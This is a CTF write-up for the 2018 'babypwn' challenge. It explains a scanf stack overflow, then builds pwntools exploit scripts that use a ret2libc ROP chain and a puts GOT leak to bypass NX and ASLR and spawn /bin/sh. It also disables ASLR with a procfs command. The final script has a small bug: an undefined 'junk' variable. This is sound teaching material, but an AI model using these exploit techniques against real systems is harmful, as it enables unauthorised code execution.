**Objectives**

* vulnerability concepts
* ASLR and NX concepts
* understanding GOT and PLT 
* Bypass Non-Execute 
* leaking base address
* secure coding 



Sup folk, a couple a week ago I participated in pwn unversity 2018 and my goal was is only to focuses on Binary Exploitation since I do not have a team and I do not need one , because the goal of the CTF's from my perspective is to improve your skills some people agree/disagree. Anyway let's get start , they provides a both binary and libc. The first though came to my mind is ASLR enable and some memory protections need to bypass , if you do a bunch of binary exploitation, it will come to your mind as well.

-  [babypwn2018](https://github.com/0x43434343/pwn/tree/master/babypwn)
Let's start at the beginning , first we need to disable ASLR and we'll enable it later 

```
echo 0 > /proc/sys/kernel/randomize_va_space


```



```

vagrant@vagrant:~/pwn/pwn_university2018/babypwn$ file babypwn
babypwn: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=aceea8523337cd304e3835a461e68c809d12fc01, not stripped

```

we've know that we are dealing with x64 ! who caries it's going to be easy to exploit weather x86 or x64 , However there is something different between them and hopefully gonna cover this 


**check the memory protections**
```sh
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL


```

it's time to test the binary 
```sh
vagrant@vagrant:~/pwn/pwn_university2018/babypwn$ echo ` python -c 'print "A" * 0x500'` | ./babypwn
Welcome student! Can you run /bin/sh
Segmentation fault (core dumped)


```
Hola , our game just get start it since we've seen Segmentation fault , now let's try to understand 
the binary and disassemble it to see what we are dealing with ! 


```sh

gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0000000000401169 <+0>:	push   rbp 
   0x000000000040116a <+1>:	mov    rbp,rsp
   0x000000000040116d <+4>:	lea    rdi,[rip+0xe9c]        # 0x402010 # 
   0x0000000000401174 <+11>:	call   0x401030 <puts@plt>
   0x0000000000401179 <+16>:	mov    rax,QWORD PTR [rip+0x2e90]        # 0x404010 <stdout@@GLIBC_2.2.5>
   0x0000000000401180 <+23>:	mov    rdi,rax
   0x0000000000401183 <+26>:	call   0x401040 <fflush@plt>
   0x0000000000401188 <+31>:	mov    eax,0x0
   0x000000000040118d <+36>:	call   0x401146 <copy> // we are going to check this out 
   0x0000000000401192 <+41>:	mov    eax,0x0
   0x0000000000401197 <+46>:	pop    rbp
   0x0000000000401198 <+47>:	ret
End of assembler dump.
```

in the above disassmble nothing interesting except copy call , so let's check it out
	

Here is the vulnerability function and scanf doesn't check the size , so it's insecure and have ability to overwrite the return address

```sh
gdb-peda$ pdisass copy
Dump of assembler code for function copy:
   0x0000000000401146 <+0>:	push   rbp //
   0x0000000000401147 <+1>:	mov    rbp,rsp
   0x000000000040114a <+4>:	add    rsp,0xffffffffffffff80
   0x000000000040114e <+8>:	lea    rax,[rbp-0x80] //char size
   0x0000000000401152 <+12>:	mov    rsi,rax
   0x0000000000401155 <+15>:	lea    rdi,[rip+0xeac]        # 0x402008 // variable[80]
   0x000000000040115c <+22>:	mov    eax,0x0
   0x0000000000401161 <+27>:	call   0x401050 <__isoc99_scanf@plt>
   0x0000000000401166 <+32>:	nop
   0x0000000000401167 <+33>:	leave
   0x0000000000401168 <+34>:	ret
End of assembler dump.


```

**pseudocode**

it will be some thing like this 

```c
	char buf[112];

	scanf("%s",0x402008)


```


**scanf()***

```c

The C library function int scanf(const char *format, ...) reads formatted input from stdin.


```



no need more analysis since we're dealing with a based stack overflow , since there is no malloc or alloc , we can overwrite the return address directly but keep in mind NX enable,However we are going to bypass it , 

**NX (No-Execute)**

```
Its an exploit mitigation technique which makes certain areas of memory non executable and makes an executable area, non writable. Example: Data, stack and heap segments are made non executable while text segment is made non writable.


```

**Bypass NX**

```c
NX-Stack

• Code injected onto the stack will not run
• Now enabled by default in most Linux
distributions, OpenBSD, Mac OS X, and
Windows
• Bypass techniques involve executing code
elsewhere, not on the stack
• The return address can still be overwritten


#ret2data techniques
• Place shellcode in the data section
– Using buffered I/O, which places data on the
heap, or some other technique
• Use the corrupted return value to jump to
it



ret2libc

Use return address to jump directly to
code in libc
– Such as system() on Unix or WinExec() on
Windows



#using mprotect() syscall to make the stack executable



```

fuzzing and dtermine the offset 

```sh
gdb-peda$ pattern_create 500 1.txt
Writing pattern of 500 chars to filename "1.txt"
gdb-peda$ r < 1.txt



gdb-peda$ x/wx $rsp
0x7ffdaf7ad538:	0x41514141


gdb-peda$ pattern_offset 0x41514141
1095844161 found at offset: 136
```

**difference between x64 and x86 overwrite RIP**
we got the top of the Stack and you may wonder why in x64 cannot overwrite the RIP directly with 0x4141414141? 

the simple answer for that is the biggest address in x64 is 0x00007fffffffffff so we can't overwrite it 0x41414141414141 for instance, make sense right ? 



**Controling RIP**


```sh

>>> "A" * 136 + "CCCC"
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC'



```

 if you make C * 8 which means won't meet the prerequiste since the highest address is 
'0x00007fffffffffff'. Our goal is to obtain a shell in this challenge ,I'd remind you , NX enable and should use one of those techniques that we talked about it in the privious. In this case , I'll use ret2libc , now let's get the system call and find "/bin/sh" string addresses for later use 

```sh
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7f29b5438390 <__libc_system>


gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 4 results, display max 4 items:
babypwn : 0x40202d --> 0x68732f6e69622f ('/bin/sh')
babypwn : 0x40302d --> 0x68732f6e69622f ('/bin/sh')
 [heap] : 0x135602d ("/bin/sh\n")
   libc : 0x7f29b557fd57 --> 0x68732f6e69622f ('/bin/sh')


```
our payload now is ready to get a shell , let's make it 


#Clearify x64 & x86 

to perform ret2libc in x86 we can use the payload such as like this 

***x86***

```sh
| JUNK | system | FAKE | /bin/sh | 
```

However , since we know the highest address in x64 should be less or equal 0x00007fffffffffff , in this case we are going to use ROP gadget and our payload should be like this 

***x64***

```sh
| JUNK | POPRDI | /bin/sh | system | 
```

```

https://github.com/sashs/Ropper
```

let's find a pop rdi using Ropper 

```sh
vagrant@vagrant:~/pwn/pwn_university2018/babypwn$ ropper --file babypwn --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: babypwn
0x0000000000401203: pop rdi; ret;

```
let's go ahead and improve our exploit 

```python

from pwn import *



def exploit(r):


	system = p64(0x7ffff7a52390)
	sh = p64(0x7ffff7b99d57)
	poprdi = p64(0x0000000000401203)
	junk = "\x90" * 136
	r.sendline(junk + poprdi + sh + system)

	r.interactive()
if __name__ == '__main__':

    if(len(sys.argv) > 1):

        r = remote(HOST,PORT)
    
        exploit(r)
    else:
        file = 'babypwn'
        binary = os.getcwd() + '/' + str(file)
        r = process(binary)
        print(util.proc.pidof(r))
        pause()
        exploit(r)



```

when we run the exploit , it's gonna work and give us a shell 


```python

vagrant@vagrant:~/pwn/pwn_university2018/babypwn$ python writeup.py
[+] Starting local process '/home/vagrant/pwn/pwn_university2018/babypwn/babypwn': pid 2132

```

let's see what happened in the low level and how we obtain the shell 


```python

   0x0000000000401166 <+32>:	nop
   0x0000000000401167 <+33>:	leave
   0x0000000000401168 <+34>:	ret
End of assembler dump.
gdb-peda$ b *0x0000000000401166
Breakpoint 1 at 0x401166

```
when we run the exploit that's what happened 

```python
   0x401167 <copy+33>:	leave
=> 0x401168 <copy+34>:	ret
   0x401169 <main>:	push   rbp
   0x40116a <main+1>:	mov    rbp,rsp
   0x40116d <main+4>:	lea    rdi,[rip+0xe9c]        # 0x402010
   0x401174 <main+11>:	call   0x401030 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe448 --> 0x401203 (<__libc_csu_init+99>:	pop    rdi)
0008| 0x7fffffffe450 --> 0x7ffff7b99d57 --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffe458 --> 0x7ffff7a52390 (<__libc_system>:	test   rdi,rdi)
0024| 0x7fffffffe460 --> 0x0
0032| 0x7fffffffe468 --> 0x7fffffffe538 --> 0x7fffffffe758 ("/home/vagrant/pwn/pwn_university2018/babypwn/babypwn")
0040| 0x7fffffffe470 --> 0x1f7ffcca0
0048| 0x7fffffffe478 --> 0x401169 (<main>:	push   rbp)
0056| 0x7fffffffe480 --> 0x0


```
the stack will pop rdi then /bin/sh will insert to rdi , then it will return to libc_system 



**ASLR ( address space layout randomization )**


```python
ASLR was introduced into the Linux kernel in 2005, earlier in 2004 it has been available as a patch. With memory randomization enabled the address space in which an application is randomised. Meaning that an application does not use the address space on each execution. This is standard behaviour for Linux modules as they are required to be compiled with ASLR support. For you to observe this though it most be enabled in the Kernel using the procfs. It is enabled by default in most Linux distributions if not all


```

**How we can bypass the ASLR ?**

In our case , to bypass ASLR we need to leaak a pointer address 


**Why do we need bypass ASLR ?**

let's simplify the answer , in our case we've got the system call and /bin/sh works , so what if I tell you if the ASLR enable and you get the addresses when you run the program using gdb and once you quit then back to run the program again the addresses that you got before it will be totally differnt from the privious one , got it ? cool. Now let's go back and try to find a way to leak the pointer address.


**GOT**

```python
GOT stands for Global Offsets Table and is similarly used to resolve addresses. Both PLT and GOT and other relocation information is explained in greater length in this article.



```

**PLT**

```python

PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time.




```

***Leak the address of a library function in GOT***

In order to leak the address , first we need to check the disassembly code out and decide what GOT will use to serve us.

```python


   0x0000000000401169 <+0>:	push   rbp
   0x000000000040116a <+1>:	mov    rbp,rsp
   0x000000000040116d <+4>:	lea    rdi,[rip+0xe9c]        # 0x402010
   0x0000000000401174 <+11>:	call   0x401030 <puts@plt>
   0x0000000000401179 <+16>:	mov    rax,QWORD PTR [rip+0x2e90]        # 0x404010 <stdout@@GLIBC_2.2.5>
   0x0000000000401180 <+23>:	mov    rdi,rax

```
we can see the puts@plt , and the pointer is 0x402010 which hold "Welcome student! Can you run /bin/sh". Why is that important to us , instead of print a regular string , we're going to force the put to print a specfic address for later use.  



let's get GOT first 
```python
vagrant@vagrant:~/pwn/pwn_university2018/babypwn$ objdump -R ./babypwn | grep put
0000000000403fc8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5

```

Now we need to use put@plt in order to make the leak happen and print put@got pointer after that we can calculate to get the base address. Here we go now let's improve our exploit and make some modify on it 


```python


from pwn import *



def exploit(r):


	system = p64(0x7ffff7a52390)
	sh = p64(0x7ffff7b99d57)
	poprdi = p64(0x0000000000401203)
	junk = "\x90" * 136
	puts_plt = p64(0x401030)
	puts_got = p64(0x0000000000403fc8)
	main = p64(0x0000000000401169)
	r.sendline(junk + poprdi + puts_got + puts_plt + main)

	r.interactive()
if __name__ == '__main__':

    if(len(sys.argv) > 1):

        r = remote(HOST,PORT)
    
        exploit(r)
    else:
        file = 'babypwn'
        binary = os.getcwd() + '/' + str(file)
        r = process(binary)
        print(util.proc.pidof(r))
        pause()
        exploit(r)




```

```python

vagrant@vagrant:~/pwn/pwn_university2018/babypwn$ python writeup.py

[2513]
[*] Paused (press any to continue)
[*] Switching to interactive mode
Welcome student! Can you run /bin/sh
```

let's hit the gdb and see what is happened through the payload execution


```python
=> 0x401168 <copy+34>:	ret
   0x401169 <main>:	push   rbp
   0x40116a <main+1>:	mov    rbp,rsp
   0x40116d <main+4>:	lea    rdi,[rip+0xe9c]        # 0x402010
   0x401174 <main+11>:	call   0x401030 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe448 --> 0x401203 (<__libc_csu_init+99>:	pop    rdi) //

0016| 0x7fffffffe458 --> 0x401030 (<puts@plt>:	jmp    QWORD PTR [rip+0x2f92]        # 0x403fc8)  #2
0024| 0x7fffffffe460 --> 0x401169 (<main>:	push   rbp)
0032| 0x7fffffffe468 --> 0x7fffffffe500 --> 0x401060 (<_start>:	repz nop edx)
0040| 0x7fffffffe470 --> 0x1f7ffcca0
0048| 0x7fffffffe478 --> 0x401169 (<main>:	push   rbp)
0056| 0x7fffffffe480 --> 0x0
```


* 1- it will pop the put_got into rdi register
* 2- time to return to put@plt and going to print the address (leak function) 

 
Clearly now we can see the leak address and time to fix our exploit and make some calculation
```

Welcome student! Can you run /bin/sh
\x90Ƨ��
```

**fix our exploit**


let's add the python code to store the leak address into a value then print it, then we are going to calculuate the libc base address.

```python

	r.recvline("Welcome student! Can you run /bin/sh")
	data = r.recv(6)

	data += "\x00" *(8 - len(data))
	leak = u64(data)
	libcAddress = leak - libc.sym['puts']
	
	log.info("[+] libc.address : " + hex(libcAddress))

```

**ELF symbool**


* libc.sym['puts'] Symbols are a symbolic reference to some type of data or code such as a global variable or function


getting libc base address is the first step to bypass ASLR. However , so far we're disabling ASLR  remeber that. So far we defeated ASLR and it's time to enable it to test our exploit

```
echo 2 > /proc/sys/kernel/randomize_va_space

```



```python


from pwn import *



def exploit(r):


	system = p64(0x7ffff7a52390)
	sh = p64(0x7ffff7b99d57)
	poprdi = p64(0x0000000000401203)
	puts_plt = p64(0x401030)
	puts_got = p64(0x0000000000403fc8)
	main = p64(0x0000000000401169)
	r.sendline(junk + poprdi + puts_got + puts_plt + main)

	r.recvline("Welcome student! Can you run /bin/sh")
	data = r.recv(6)
	data += "\x00" *(8 - len(data))
	leak = u64(data)
	libcAddress = leak - libc.symbols['puts']
	system = libcAddress + libc.symbols['system']
	sh = libcAddress + next(libc.search('/bin/sh'))
	log.info("[+] libc.address : " + hex(leak))
	log.info("[+] system : " + hex(system))
	log.info("[+] /bin/sh : " + hex(sh))
	r.sendline(junk + poprdi + p64(sh) + p64(system) )
	r.interactive()


if __name__ == '__main__':

	if(len(sys.argv) > 1):

		r = remote(HOST,PORT)
		exploit(r)
	else:
		file = 'babypwn'
		binary = os.getcwd() + '/' + str(file)
		r = process(binary)
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		print(util.proc.pidof(r))
		pause()
		exploit(r)




```

our exploit is ready to hit

**Secure coding**

if you are lazy programmer and you want to use string in scanf that fine. It can use scanf with pointers and free it once you've done.



"""
Many answers here discuss the potential overflow issues of using scanf("%s", buf), but the latest POSIX specification more-or-less resolves this issue by providing an m assignment-allocation character that can be used in format specifiers for c, s, and [ formats. This will allow scanf to allocate as much memory as necessary with malloc (so it must be freed later with free).

"""
```python

char *buf;
scanf("%ms", &buf); // with 'm', scanf expects a pointer to pointer to char.

// use buf

free(buf);

```
